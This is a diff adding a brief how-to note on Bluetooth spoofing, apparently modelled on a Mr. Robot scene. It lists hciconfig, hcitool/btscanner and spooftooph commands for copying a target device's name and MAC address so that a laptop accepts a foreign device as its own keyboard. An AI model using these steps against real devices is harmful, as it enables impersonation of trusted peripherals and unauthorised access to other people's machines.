@@ -1,0 +1,23 @@
+SIMPLE BT SPOOFING
+------------------
+In the 6th Mr.Robot episode, Elliot makes the cop's laptop to
+believe that its keyboard is actually Elliot's one. Steps are
+the following:
+1) Bluetooth start service:
+	>> service bluetooth start
+2) Activate bluetooth device
+	>> hciconfig hci0 up
+3) Check if it's working
+	>> hciconfig hci0
+4)Scann for BT devices; 2 options:
+	>> btscanner
+	>> hcitool
+5) Use -i to inquiry devices and then copy the name and the MAC
+of the device to be spoofed. 
+6) Then, time to spoof
+	>> spooftooph -i hci0 -a AA:AA:AA:AA:AA:AA: -n BTname
+
+7) CHeck if it has been spoofed
+	>> hciconfig hci0 name
+
+ 
